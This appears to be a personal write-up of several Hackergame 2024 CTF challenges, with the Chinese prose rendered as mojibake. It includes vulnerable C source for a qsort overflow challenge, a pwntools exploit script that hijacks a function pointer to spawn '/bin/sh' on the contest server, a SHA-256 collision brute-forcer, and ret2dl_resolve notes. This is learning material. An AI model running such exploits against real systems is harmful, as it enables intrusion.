[å®˜æ–¹wp](https://github.com/USTC-Hackergame/hackergame2024-writeups?tab=readme-ov-file)


## 1. æˆ‘ä»¬çš„å¿«æ’ç¡®æœ‰é—®é¢˜
> è¿™é“é¢˜ç›®æ˜¯å”¯ä¸€åšå‡ºæ¥çš„ä¸€é“æœ‰ä¸€ç‚¹éš¾åº¦çš„é¢˜ï¼Œå…¶ä»–å‡ é“æ¶‰åŠçš„çŸ¥è¯†éƒ½ä¸å¤ªæ‡‚ï¼Œè¿™é“é¢˜ä½¿ç”¨äº†ä¸€ä¸ªcveæ¼æ´ï¼Œæ˜¯é€šè¿‡ *hackergame2023* çš„ä¸€ä¸ªé¢˜ç›®å¾—åˆ°å¯å‘
> è¿™ä¸ªcveæ¼æ´æ˜¯ç½‘ä¸ŠæŸ¥æ‰¾ï¼Œé˜…è¯»æ¼æ´çš„å¤ç°è¿‡ç¨‹ï¼Œå¾—åˆ°æ¼æ´ä½¿ç”¨æ–¹æ³•ï¼Œç„¶åå°±èƒ½ç¼–å†™æ¼æ´åˆ©ç”¨ç¨‹åº
> æ¼æ´å¾ˆç®€å•ï¼Œå°±æ˜¯glibcåº“é‡Œçš„qsortå‡½æ•°åœ¨ä½¿ç”¨éé€’å½’æ¯”è¾ƒå‡½æ•°æ—¶ï¼Œä¼šå‘ç”Ÿæº¢å‡ºï¼Œä½†å‰ææ˜¯è¾“å…¥å¾ˆå¤§ï¼Œç¼“å†²åŒºä¸å¤Ÿç”¨ï¼Œä»¥åŠmallocå¤±æ•ˆ
> è¿™ä¸ªæ¼æ´åœ¨ç°å®ä¸–ç•Œæ˜¯æ¯”è¾ƒéš¾å¤ç°çš„ï¼Œå› ä¸ºæ—¢è¦å†™ä¸€ä¸ªéé€’å½’çš„æ¯”è¾ƒï¼Œè¿˜è¦ä½¿å¾—mallocå®ç°
> é€’å½’æ¯”è¾ƒçš„æ„æ€å°±æ˜¯ï¼Œå¦‚æœa>b,b>c,é‚£ä¹ˆa>c
> åšè¿™ä¸ªé¢˜ç›®çš„æ—¶å€™å®Œæ•´çš„é˜…è¯»äº†ä¸€ç¯‡å…³äºè¿™ä¸ªæ¼æ´çš„ç ”ç©¶ï¼Œæ„Ÿè§‰å¾ˆæœ‰æ„æ€
> ä¸‹é¢æ˜¯é¢˜ç›®æºä»£ç ï¼š
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/time.h>
#define MAX_STU_NUM 0x100

struct {
        int (*sort_func)(const void *const, const void *const);
        double temp_sort_array[MAX_STU_NUM];
} gms;

void *unused() { return NULL; }
void doredolaso() {
    __asm__("add rsp, 8;"
            "jmp [rsi];");
}
void why_theres_a_b4ckd00r_in_my_GMS() {
    puts("çä¸€å€‹ ğŸŒ¸âŒšï¸");
    system("echo ğŸŒ¸âŒšï¸");
}

void inits() {
    setvbuf(stdin, 0LL, 2, 0LL);
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stderr, 0LL, 2, 0LL);
}

void banner() {
    puts("===================================================");
    puts("        Our QuickSort Indeed Has Problems          ");
    puts("     gpasortings Ystemth At Utilizes quicksort     ");
    puts("===================================================");
}

void disable_malloc() {
    /* æˆ‘èªç‚º malloc æ‡‰è©²è¢«å–æ¶ˆèª¿ç”¨è³‡æ ¼ */
    size_t puts_addr = (size_t)&puts;
    size_t malloc_hook_addr = puts_addr + 0x168750;
    *(size_t *)malloc_hook_addr = (size_t)&unused;
}

int whos_jipiei_is_better(const void *const pa, const void *const pb) {
    const double a = *(const double *)pa;
    const double b = *(const double *)pb;

    if (!a || !b) {
        return 0;
    }
    if (a < 2.5 || b < 2.5) {
        puts("With such grades, how can we sort them?");
        return -1;
    }
    if (a < b)
        return -1;
    if (a > b)
        return 1;
    return 0;
}

int main() {
    inits();
    banner();
    disable_malloc();

    int student_num;    
    char student_num2[0x28];

    puts("Enter student number:");
    scanf("%d", &student_num);
    if (student_num <= 0 || student_num > MAX_STU_NUM) {
        puts("That's too many students! We'll let someone else handle this.");
        return -1;
    }

    puts("Enter the GPA data:");
    for (int i = 0; i < student_num; i++) {
        scanf("%lf", &(gms.temp_sort_array[i]));
    }

    puts("Processing...");
    gms.sort_func = whos_jipiei_is_better;
    qsort(gms.temp_sort_array, student_num, sizeof(double), gms.sort_func);

    puts("Oops, sorting a wrong direction. Processing again...");
    for (int i = 0; i < student_num; i++) {
        scanf("%lf", &(gms.temp_sort_array[i]));
    }
    qsort(gms.temp_sort_array, student_num, sizeof(double), gms.sort_func);

    return 0;
}
```
> è¿™é‡Œæ„å›¾å…¶å®å¾ˆæ˜æ˜¾äº†ï¼Œå…ˆæ˜¯åºŸäº†mallocï¼Œç„¶åä½¿ç”¨äº†ä¸€ä¸ªéé€’å½’çš„æ¯”è¾ƒå‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨qsortä¿®æ”¹ç»“æ„ä½“æ•°ç»„ä¸Šé¢çš„comparå‡½æ•°,æ”¹ä¸ºdoredolasoçš„åœ°å€
> å¡«å……è¿›å»system()çš„åœ°å€ï¼Œç„¶åç¬¬äºŒæ¬¡è°ƒç”¨qsortçš„æ—¶å€™ï¼Œä¼šè°ƒç”¨systemå‡½æ•°ï¼Œä½†æ˜¯éœ€è¦å¡«å……commandï¼Œè¾“å…¥æ”¾åˆ°ç»“æ„ä½“æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸Š
> æ¼æ´åˆ©ç”¨çš„æ—¶å€™è¦æ³¨æ„å¡«å……æ¯”è¾ƒå¤šçš„è¾“å…¥ï¼Œä½¿å¾—åˆ†é…çš„ç¼“å†²åŒºä¸å¤Ÿç”¨ï¼Œè¿™å°±ä¼šä½¿å¾—å‘ç”Ÿæº¢å‡ºï¼Œæœ€å°çš„é‚£ä¸ªæ•°ä¼šé¡¶æ‰comparå‡½æ•°

### å­¦ä¹ ä¸€ä¸‹pwnè„šæœ¬çš„ç¼–å†™
> åšè¿™é¢˜éƒ½æ˜¯ç›´æ¥è‡ªå·±ç¼–è¾“å…¥çš„ï¼Œæ¯”è¾ƒç¬¨æ‹™ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡åšpwné¢˜ï¼Œä¸‹é¢æ¥å­¦ä¹ ä¸€ä¸‹pwnè„šæœ¬çš„ç¼–å†™
```python
#!/usr/bin/env python3

from pwn import *

# è®¾ç½®pwntoolsåº“çš„ä¸Šä¸‹æ–‡
context.log_level = "info"   # å°†æ—¥å¿—çº§åˆ«è®¾ç½®ä¸º "info"ï¼Œä»¥ä¾¿å¯ä»¥çœ‹åˆ°ä¿¡æ¯æ—¥å¿—
context.arch = "amd64"       # è®¾ç½®ç›®æ ‡æ¶æ„ä¸ºamd64ï¼Œè¡¨ç¤ºç›®æ ‡ç³»ç»Ÿæ˜¯64ä½æ¶æ„

# è¿æ¥åˆ°è¿œç¨‹æœåŠ¡å™¨
io = remote("202.38.93.141", 31341)   # ç›®æ ‡IPå’Œç«¯å£ï¼Œç”¨äºå»ºç«‹è¿œç¨‹è¿æ¥

# å®šä¹‰éœ€è¦ä½¿ç”¨çš„åœ°å€
JOP_gadget = 0x4011DD           # æ§åˆ¶æµè·³è½¬çš„JOP (Jump-Oriented Programming) gadgetåœ°å€
GET_my_hwatch_addr = 0x401201   # ç”¨äºè·å–æ‰‹è¡¨ï¼ˆhwatchï¼‰ä¿¡æ¯çš„å‡½æ•°åœ°å€

# æ¥æ”¶ä¸€è¡Œæ•°æ®ï¼ˆé€šå¸¸æ˜¯æœåŠ¡å™¨çš„æ¬¢è¿æ¶ˆæ¯æˆ–æç¤ºï¼‰
io.recvline()
# æç¤ºç”¨æˆ·è¾“å…¥ä»¤ç‰Œï¼ˆtokenï¼‰ï¼Œå°†è¾“å…¥è½¬æ¢ä¸ºå­—èŠ‚å¹¶å‘é€ç»™æœåŠ¡å™¨è¿›è¡Œèº«ä»½éªŒè¯
io.sendline(input("Input your token: ").encode())


# å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œå°†64ä½æ•´æ•°è½¬æ¢ä¸ºåŒç²¾åº¦æµ®ç‚¹æ•°
def i64tof64(int_value):
    # å°†æ•´æ•°è½¬æ¢ä¸ºå°ç«¯å­—èŠ‚è¡¨ç¤º(å°ç«¯å­—èŠ‚è¡¨ç¤ºæ˜¯æŒ‡ä½åœ°å€å­—èŠ‚åœ¨å‰ï¼Œå°±æ˜¯è¯´å’Œæ™®é€šé˜…è¯»æ–¹å¼ç›¸åï¼Œç”¨åœ¨è®¸å¤šå¤„ç†å™¨æ¶æ„çš„å­˜å‚¨ä¸­)ï¼Œå¹¶å†å°†å…¶è½¬æ¢ä¸ºåŒç²¾åº¦æµ®ç‚¹æ•°
    bytes_value = struct.pack("<Q", int_value)#packç”¨äºå°†æ•°æ®æŒ‰ç…§æŒ‡å®šçš„æ ¼å¼ç¼–ç æˆå­—èŠ‚ä¸²ï¼Œâ€œ<â€è¡¨ç¤ºä½¿ç”¨å°ç«¯å­—èŠ‚åºï¼Œâ€œQâ€è¡¨ç¤º64ä½æ— ç¬¦å·æ•´æ•°
    double_value = struct.unpack("<d", bytes_value)[0]#ç”¨äºå°†å­—èŠ‚ä¸²è§£ç ä¸ºæŒ‡å®šæ ¼å¼çš„æ•°æ®
    return double_value


# å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œå°†åŒç²¾åº¦æµ®ç‚¹æ•°è½¬æ¢ä¸º64ä½æ•´æ•°
def f64toi64(double_value):
    # å°†åŒç²¾åº¦æµ®ç‚¹æ•°è½¬æ¢ä¸ºå°ç«¯å­—èŠ‚è¡¨ç¤ºï¼Œå†è½¬æ¢ä¸º64ä½æ•´æ•°
    bytes_value = struct.pack("<d", double_value)
    int_value = struct.unpack("<Q", bytes_value)[0]
    return int_value


# ç­‰å¾…æ¥æ”¶åˆ°ç‰¹å®šè¾“å…¥æç¤ºç¬¦
io.recvuntil(":\n".encode())
# å‘é€ä¸€ä¸ªæ•´æ•°0x100ï¼Œå¯èƒ½æ˜¯å‘é€æ•°ç»„å¤§å°çš„æŒ‡ä»¤
io.sendline(str(0x100).encode())

# æ„é€ ä¸€ä¸ªåŒ…å«256ä¸ªæµ®ç‚¹æ•°çš„åˆ—è¡¨ï¼Œåˆå§‹å€¼å‡ä¸º4.3
stu_list = [4.3 for i in range(0x100)]
# å°†åˆ—è¡¨ä¸­çš„ç¬¬16ä¸ªå…ƒç´ è®¾ä¸ºJOP_gadgetå¯¹åº”çš„æµ®ç‚¹æ•°ï¼Œä»¥è¦†ç›–è¯¥ä½ç½®çš„æ•°æ®å¹¶æ§åˆ¶è·³è½¬åœ°å€
stu_list[0x10] = i64tof64(JOP_gadget)

# ç­‰å¾…æ¥æ”¶åˆ°ä¸‹ä¸€ä¸ªè¾“å…¥æç¤ºç¬¦
io.recvuntil(":\n".encode())
# ä¾æ¬¡å‘é€stu_listä¸­çš„æ¯ä¸ªæµ®ç‚¹æ•°å€¼ï¼Œé€ä¸ªç¼–ç ä¸ºå­—ç¬¦ä¸²å¹¶å‘é€
for i in stu_list:
    io.sendline(str(i).encode())

# ç­‰å¾…æ¥æ”¶æœåŠ¡å™¨çš„ç‰¹å®šæç¤ºç¬¦
io.recvuntil(b"...\n")
# å°†GET_my_hwatch_addrçš„æµ®ç‚¹æ•°å€¼å‘é€ç»™æœåŠ¡å™¨ï¼Œç”¨äºè§¦å‘æŒ‡å®šå‡½æ•°çš„æ‰§è¡Œ
io.sendline(str(i64tof64(GET_my_hwatch_addr)).encode())

# æ¥ä¸‹æ¥å‘é€255æ¬¡"/bin/sh"çš„æµ®ç‚¹è¡¨ç¤ºï¼Œä»¥ä¾¿ä¼ é€’å¯èƒ½æ‰§è¡Œshellçš„æŒ‡ä»¤
for _ in range(0x100 - 1):
    # å°†"/bin/sh"å­—ç¬¦ä¸²è½¬æ¢ä¸ºæµ®ç‚¹æ•°ï¼Œç¼–ç ä¸ºå­—ç¬¦ä¸²å¹¶å‘é€
    io.sendline(str(i64tof64(u64(b"/bin/sh\x00"))).encode())

# è¿›å…¥äº¤äº’æ¨¡å¼ï¼Œå¦‚æœæˆåŠŸåˆ©ç”¨æ¼æ´ï¼Œå°†è·å¾—è¿œç¨‹shellçš„è®¿é—®æƒé™
io.interactive()

```

***
***



## 2. hashä¸‰ç¢°æ’
> è¿™ä¸ªé¢˜ç›®åªåšäº†ç¬¬ä¸€é—®ï¼Œæˆ‘ä»¥ä¸ºè‡ªå·±æ˜¯æ ‡å‡†è§£ï¼Œæ²¡æƒ³åˆ°æ˜¯éé¢„æœŸè§£ï¼Œé¢˜è§£ä¸­æ¨èä½¿ç”¨aiå°†ä¼ªä»£ç è½¬åŒ–ä¸ºä»£ç ï¼Œè¯•ä¸€ä¸‹ï¼š
```python
import hashlib

def hex_to_bin(hex_str):
    return bytes.fromhex(hex_str)

def main():
    # è¯»å–è¾“å…¥
    s1 = [input(f"Data {i + 1}: ").strip() for i in range(3)]
    v12 = [hex_to_bin(s) for s in s1]

    # ç¡®ä¿è¾“å…¥åˆæ³•å¹¶ä¸”ä¸åŒ
    assert all(len(s) <= 16 for s in s1) and len(set(s1)) == 3  #len(set(s1))ç”¨äºæ£€æŸ¥åˆ—è¡¨ä¸­æ˜¯å¦æœ‰é‡å¤å…ƒç´ ,ä¿è¯è¾“å…¥ç›¸åŒ

    # è®¡ç®—SHA-256å“ˆå¸Œï¼Œå¹¶å–å4å­—èŠ‚ç”Ÿæˆæ•´æ•°
    v9, v10, v11 = [int.from_bytes(hashlib.sha256(v).digest()[:4], 'big') for v in v12]

    # æ£€æŸ¥æ˜¯å¦ç›¸ç­‰å¹¶è¾“å‡ºç»“æœ
    if v9 == v10 == v11:
        with open("flag1", "r") as stream:
            print(stream.read())
    else:
        print("Wrong answer")

if __name__ == "__main__":
    main()

```
ã€

> è¿™é“é¢˜æˆ‘æ˜¯æ ¹æ®æ¯”è¾ƒçš„åœ°æ–¹ä¸åŒæ¥å®ç°çš„ï¼Œå‰ä¸€ä¸ªæ¯”è¾ƒä¸åŒï¼Œæ¯”è¾ƒçš„åŸè¾“å…¥ï¼Œæ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œè€Œsha256æ¥å—çš„è¾“å…¥æ˜¯ç»Ÿä¸€å°å†™çš„ï¼Œå› æ­¤åªè¦ä¸‰ä¸ªæ•°æ®åˆ†åˆ«æœ‰å‡ ä¸ªå¤§å°å†™ä¸åŒå°±å¯ä»¥äº†

> é¢˜è§£ç«Ÿç„¶æ˜¯ç¡¬è§£

```cpp
#include <iostream>
#include <unordered_map>
#include <vector>
#include <string>
#include <openssl/sha.h> // éœ€è¦å®‰è£… OpenSSL åº“

int main() {
    uint64_t counter = 0;
    std::unordered_map<uint32_t, std::vector<std::string>> hash_map;

    while (true) {
        // å°†è®¡æ•°å™¨è½¬æ¢ä¸º 8 å­—èŠ‚å­—ç¬¦ä¸²
        char str[8];
        for (int i = 0; i < 8; ++i) {
            str[7 - i] = (counter >> (8 * i)) & 0xFF;
        }
        // è®¡ç®— SHA256 å“ˆå¸Œ
        unsigned char hash[SHA256_DIGEST_LENGTH];
        SHA256((unsigned char*)str, 8, hash);
        // æå–å“ˆå¸Œå€¼çš„å 4 ä¸ªå­—èŠ‚
        uint32_t last4bytes = 0;
        for (int i = 0; i < 4; ++i) {
            last4bytes = (last4bytes << 8) | hash[SHA256_DIGEST_LENGTH - 4 + i];
        }
        // å­˜å…¥æ˜ å°„è¡¨
        std::string s(str, 8);
        hash_map[last4bytes].push_back(s);
        // å¦‚æœæ‰¾åˆ°ä¸‰ä¸ªå­—ç¬¦ä¸²ï¼Œè¾“å‡ºç»“æœ
        if (hash_map[last4bytes].size() == 3) {
            std::cout << "åœ¨å°è¯•äº† " << counter + 1 << " æ¬¡åæ‰¾åˆ°ä¸‰ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒä»¬çš„ SHA256 å“ˆå¸Œå€¼çš„å 4 ä¸ªå­—èŠ‚ç›¸åŒï¼š" << std::endl;
            for (const auto& val : hash_map[last4bytes]) {
                // ä»¥åå…­è¿›åˆ¶è¾“å‡ºå­—ç¬¦ä¸²
                for (unsigned char c : val) {
                    printf("%02x", (unsigned char)c);
                }
                std::cout << std::endl;
            }
            break;
        }
        counter++;
        if (counter % 1000000 == 0) {
            std::cout << "å·²å°è¯•äº† " << counter << " ä¸ªå­—ç¬¦ä¸²ã€‚" << std::endl;
        }
    }

    return 0;
}

```

### ç¬¬äºŒé—®ç”¨äº†åŒºå—é“¾çš„çŸ¥è¯†
> ä½¿ç”¨aiå†™ä¸€ä¸‹ç²¾ç®€ç‰ˆé¢˜ç›®ï¼š
```python
import hashlib

def sha256(data):
    return hashlib.sha256(data).digest()

def hex_to_bin(hex_str):
    return bytes.fromhex(hex_str)

# è¾“å…¥å’Œåˆå§‹åŒ–æ•°æ®
input_data = input("Initial data: ").strip()
InitialData = hex_to_bin(input_data)
NoSalt = sha256(InitialData)

# åˆå§‹åŒ–åŠ ç›æ•°æ®
Salt_12 = bytearray(NoSalt)
Salt_34 = bytearray(NoSalt)

for round_num in range(100):
    print(f"Round {round_num + 1}")
    
    # è¾“å…¥å››ä»½ç›å¹¶è½¬æ¢æˆäºŒè¿›åˆ¶
    BinarySalt1 = hex_to_bin(input("Salt 1: ").strip())
    BinarySalt2 = hex_to_bin(input("Salt 2: ").strip())
    BinarySalt3 = hex_to_bin(input("Salt 3: ").strip())
    BinarySalt4 = hex_to_bin(input("Salt 4: ").strip())
    
    # æ£€æŸ¥ç›çš„é•¿åº¦
    assert len(BinarySalt1) == len(BinarySalt3)
    assert len(BinarySalt2) == len(BinarySalt4)
    
    # æ··åˆæ•°æ®å¹¶è®¡ç®—å“ˆå¸Œ
    MixingPlace1 = BinarySalt1 + Salt_12 + BinarySalt2
    Salt_12 = sha256(MixingPlace1)
    
    MixingPlace2 = BinarySalt3 + Salt_34 + BinarySalt4
    Salt_34 = sha256(MixingPlace2)
    
    # æ£€æŸ¥å“ˆå¸Œå€¼æ˜¯å¦ä¸åŒ
    assert Salt_12 != Salt_34, "Hash should be different"

# æœ€ç»ˆæ£€æŸ¥
assert Salt_12[-8:] == Salt_34[-8:] == NoSalt[-8:], "Wrong answer"
print("Correct!")
```
> ç„¶åæ˜¯åŒºå—é“¾çŸ¥è¯† 


*æˆ‘ä»¬çŸ¥é“æ¯”ç‰¹å¸ç­‰åŒºå—é“¾ä½¿ç”¨çš„å·¥ä½œé‡è¯æ˜ç®—æ³•å°±æ˜¯ä¸¤æ¬¡ SHA-256ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»åŒºå—é“¾ä¸Šå¯»æ‰¾ç­”æ¡ˆã€‚éšä¾¿æ‹¿æ¥ä¸€ä¸ªæ¯”ç‰¹å¸çš„åŒºå—å“ˆå¸Œï¼Œæ¯”å¦‚ï¼š*

*00000000000000000002043e95964c355bb333c071cfca0d74a5ae6ed59000dfæˆ‘ä»¬å¯ä»¥å‘ç°å…¶å‰ 9 ä¸ªå­—èŠ‚éƒ½æ˜¯ 0ã€‚å»æœç´¢ä¸€ä¸‹æ¯”ç‰¹å¸çš„åŒºå—å“ˆå¸Œæ˜¯å¦‚ä½•è®¡ç®—çš„å¯ä»¥å‘ç°ï¼Œå…¶å®è¿™ä¸ªåŒºå—å“ˆå¸Œçš„å­—èŠ‚åºè·Ÿæˆ‘ä»¬å¹³æ—¶è§åˆ°çš„ SHA-256 æ˜¯ç›¸åçš„ï¼Œæ‰€ä»¥è¿™ 9 ä¸ª 0 å­—èŠ‚å®é™…ä¸Šå°±æ˜¯åœ¨æœ€åï¼Œæ»¡è¶³é¢˜ç›®çš„è¦æ±‚ã€‚*

*æ¯”ç‰¹å¸çš„åŒºå—å¤´ç»“æ„æ˜¯ 80 å­—èŠ‚ï¼Œå…¶ä¸­åŒ…å«ä¸Šä¸€ä¸ªåŒºå—çš„å“ˆå¸Œã€å½“å‰åŒºå—çš„æ—¶é—´æˆ³ã€å½“å‰åŒºå—æ‰€æœ‰äº¤æ˜“çš„ Merkle Root ç­‰ç­‰ã€‚è€ŒåŒºå—çš„å“ˆå¸Œå°±æ˜¯åŒºå—å¤´è¿™ 80 å­—èŠ‚çš„å†…å®¹è®¡ç®—ä¸¤æ¬¡ SHA-256 çš„ç»“æœã€‚*

*æ‰€ä»¥ï¼Œé¢˜ç›®ä¸­çš„è¿™ç§åŠ ä¸Šå‰ç¼€å’Œåç¼€çš„è®¡ç®—ï¼Œæ°å¥½å¯ä»¥ç”¨åŒºå—å¤´ä¸­ä¸Šä¸€ä¸ªåŒºå—çš„å“ˆå¸Œå·¦è¾¹å’Œå³è¾¹çš„æ•°æ®æ¥åŒ¹é…ã€‚ä¸¤æ¬¡ SHA-256 çš„æ—¶å€™ï¼Œç¬¬äºŒæ¬¡å¹¶ä¸éœ€è¦åŠ å‰åç¼€ï¼Œæ‰€ä»¥æäº¤ç©ºä¸²å³å¯ã€‚*

*ä½†æ˜¯é¢˜ç›®è¦æ±‚çš„æ˜¯ä¸¤æ¡èµ·ç‚¹ä¸€æ ·ã€ä¸­é—´å¹¶ä¸é‡åˆçš„é“¾ï¼Œè¿™è¦ä»å“ªé‡Œå¯»æ‰¾å‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯åŒºå—é“¾çš„åˆ†å‰ã€‚æ¯”ç‰¹å¸åœ¨å†å²ä¸Šæœ‰è¿‡å‡ æ¬¡ç¡¬åˆ†å‰ï¼Œæœ€ç»å…¸çš„å°±æ˜¯æ¯”ç‰¹å¸ï¼ˆBitcoinï¼ŒBTCï¼‰åˆ†å‰ä¸ºæ¯”ç‰¹å¸ç°é‡‘ï¼ˆBitcoin Cashï¼ŒBCHï¼‰ã€‚*

*é€šè¿‡æœç´¢ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“åˆ†å‰çš„åŒºå—é«˜åº¦æ˜¯ 478558ã€‚æˆ‘ä»¬æŠŠ BTC å’Œ BCH ä¸¤æ¡é“¾åœ¨åŒºå—é«˜åº¦ 478558 é™„è¿‘çš„åŒºå—æ•°æ®ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åå¤„ç†ä¸€ä¸‹ï¼Œå°±å¯ä»¥æ„é€ å‡ºæ¥é¢˜ç›®æ‰€éœ€çš„æ•°æ®ã€‚ç†è®ºä¸Šï¼Œå…¶ä»–åˆ†å‰å¦‚æœå·¥ä½œé‡è¯æ˜çš„éš¾åº¦è¶³å¤Ÿçš„è¯ï¼Œä¹Ÿæ˜¯åŒæ ·å¯ä»¥ç”¨æ¥è§£é¢˜çš„ã€‚*

> è¶…å‡ºçŸ¥è¯†èŒƒå›´äº†

### ç¬¬ä¸‰é—®åŒæ ·è¶…å‡ºèŒƒå›´äº†ï¼Œä¸åš

## 3. ç¥ç§˜ä»£ç 2
> ç¬¬ä¸€é—®å®åœ¨æ˜¯å¥‡è‘©ï¼š

å‡ºé¢˜äºº R æ˜¯å¥—å¨ƒ Miscï¼ˆæ‚é¡¹ï¼‰çˆ±å¥½è€…ã€‚æ®è¯´ï¼Œä»–åœ¨æˆ˜é˜Ÿæ‹›æ–°æ—¶å‡ºäº†ä¸€é“æœ‰ä¸€åƒå±‚å¥—å¨ƒçš„ Misc é¢˜ç›®ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºï¼š

    å‡¯æ’’å¯†ç 
    Base64 ç¼–ç 
    RFC 1751
    Zstandard
    xz
    bzip2
    zlib

æœ€åä»¥ä¸€ä¸ª Base64 ç¼–ç å¤§ç«æ”¶æ±å„¿ï¼Œåæ›°ã€Œç¥ç§˜ä»£ç ã€ã€‚ç»“æœä¸å‡ºæ‰€æ–™ï¼Œè¿™é“é¢˜è¢«å…¶ä»–æ‰€æœ‰äººéƒ½éª‚æƒ¨äº†ã€‚

ã€Œè¿™æ¬¡ Hackergame ä½ ä¸è®¸å‡ºç¥ç§˜ä»£ç äº†ï¼ã€

å‡ºé¢˜äºº R æƒ³äº†æƒ³ï¼Œä»¥ä»–çš„ç†è§£å‡ºäº†è¿™é“é¢˜ç›®ï¼Œæ¯•ç«Ÿæ²¡æœ‰äººè¯´ä¸èƒ½å‡ºç¥ç§˜ä»£ç  2 å˜›ï¼è€Œä¸”ï¼Œæ—¢ç„¶æ˜¯ç¥ç§˜ä»£ç  2ï¼Œé‚£æˆ‘æœ‰ä¸¤ä¸ªã€Œç¥ç§˜ä»£ç ã€ï¼Œä¸è¿‡åˆ†å§ï¼Ÿ

æç¤ºï¼š

    è¿™æ˜¯ä¸€é“é€†å‘é¢˜ç›®
    æ¯ä¸€é“é¢˜ç›®ä¼šè¾“å‡ºä¸¤è¡Œï¼Œç¬¬ä¸€è¡Œæ˜¯ Base64 ç¼–ç çš„å­—èŠ‚ç ï¼Œç¬¬äºŒè¡Œæ˜¯ä»£ç è¿è¡Œç»“æœ
    ä»£ç çš„è¾“å…¥æ˜¯ flag ç»è¿‡ zlib å‹ç¼©åçš„ç»“æœï¼Œè¿™æ¬¡çœŸçš„åªæœ‰ä¸¤å±‚ï¼Œä¸åšåƒå±‚é¥¼äº†
    ä½ å¯èƒ½æ˜¯ç™¾åº¦æœç´¢çš„å—å®³è€…
    æˆ‘å·²ç»ç»å°½è„‘æ±ç»™ä½ ä»¬æç¤ºäº†é¥¶äº†æˆ‘å§

> ç¬¬ä¸€è¡Œè¾“å‡ºçš„å­—èŠ‚ç ï¼Œé•¿å¾—å¾ˆæ€ªï¼Œæœéå…¨ç½‘ï¼Œä¹Ÿæ²¡æ‰¾åˆ°è¿™ç§å­—èŠ‚ç ï¼Œç„¶åé¢˜è§£å‘Šè¯‰æˆ‘å­—èŠ‚ç åé¢çš„æ˜æ–‡æ˜¯æ‰“ä¹±çš„base64å­—ç¬¦è¡¨ã€‚ã€‚ï¼Œè¿™ä¹Ÿèƒ½å«é€†å‘é¢˜ã€‚ã€‚ã€‚
> ç„¶åå°±æ¢è¡¨base64ï¼Œå¾—åˆ°flagã€‚ã€‚ã€‚ã€‚

### ç¬¬äºŒé¢˜ç¬¬ä¸‰é¢˜è¦å­¦ä¹ uxn
> ç»™å‡ºçš„æ˜¯æ±‡ç¼–å­—èŠ‚ç 
*Talæ˜¯Uxnè™šæ‹Ÿæœºçš„ç¼–ç¨‹è¯­è¨€ï¼ŒUxnç¨‹åºæ˜¯ä¸“é—¨ä¸ºæ­¤è™šæ‹Ÿæœºè®¾è®¡çš„åŸºäºå †æ ˆçš„æ±‡ç¼–é£æ ¼ç¼–å†™çš„ã€‚TALæ˜¯å¯è¯»çš„æºæ–‡ä»¶ï¼Œromæ–‡ä»¶æ˜¯uxnå…¼å®¹çš„äºŒè¿›åˆ¶ç¨‹åºæ–‡ä»¶ï¼š*
*å°†TALæ–‡ä»¶è½¬æ¢ä¸ºROMæ–‡ä»¶çš„åº”ç”¨ç¨‹åºç§°ä¸ºAssemblers*


## 4. catç»¿è‰²ç ´è§£ç‰ˆ
> è¿™é¢˜ä¸»è¦å¡åœ¨å¦‚ä½•getshellä¸Šï¼Œå› ä¸ºé¢˜ç›®è¯´*ä½ çš„ç›®æ ‡æ˜¯ä¼ å…¥ç‰¹å®šçš„æ•°æ®ï¼Œè§¦å‘æ¤å…¥çš„åé—¨*ï¼Œä»¥ä¸ºé¢˜ç›®é‡Œé¢æœ‰åé—¨ï¼Œä½†å®Œå…¨æ²¡æœ‰æ‰¾åˆ°
> é¢˜è§£æ˜¯ä½¿ç”¨*ret2dl_resolve*æ¥å®ç°getshellçš„ï¼Œéœ€è¦å­¦ä¹ ä¸€ä¸‹ret2dlresolveçš„åŸç†ï¼š

*é™æ€é“¾æ¥ï¼šç¨‹åºåœ¨ç¼–è¯‘æ—¶ï¼Œç¼–è¯‘å™¨å°†æ‰€æœ‰éœ€è¦çš„å‡½æ•°å’Œå˜é‡éƒ½é“¾æ¥åˆ°ä¸€èµ·ï¼Œå½¢æˆä¸€ä¸ªå®Œæ•´çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚*
*åŠ¨æ€é“¾æ¥ï¼šç¨‹åºåœ¨è¿è¡Œæ—¶ï¼Œç¼–è¯‘å™¨å¹¶ä¸å°†æ‰€æœ‰å‡½æ•°å’Œå˜é‡é“¾æ¥åˆ°ä¸€èµ·ï¼Œè€Œæ˜¯å°†å‡½æ•°å’Œå˜é‡çš„åœ°å€æ”¾åœ¨ä¸€ä¸ªå«åšåŠ¨æ€é“¾æ¥åº“ï¼ˆDynamic Link Libraryï¼ŒDLLï¼‰çš„å¤–éƒ¨æ–‡ä»¶ä¸­ï¼Œç¨‹åºè¿è¡Œæ—¶æ‰å°†è¿™äº›å‡½æ•°å’Œå˜é‡åŠ è½½åˆ°å†…å­˜ä¸­ã€‚*

**ç”±äºåº“ä¸­å‡½æ•°å¹¶ä¸æ˜¯æ‰€æœ‰éƒ½éœ€è¦ï¼ŒLinuxåœ¨ç¨‹åºç¬¬ä¸€æ¬¡è°ƒç”¨å‡½æ•°æ—¶æ‰ä¼šå°†å…¶è£…è½½ç¨‹åº**
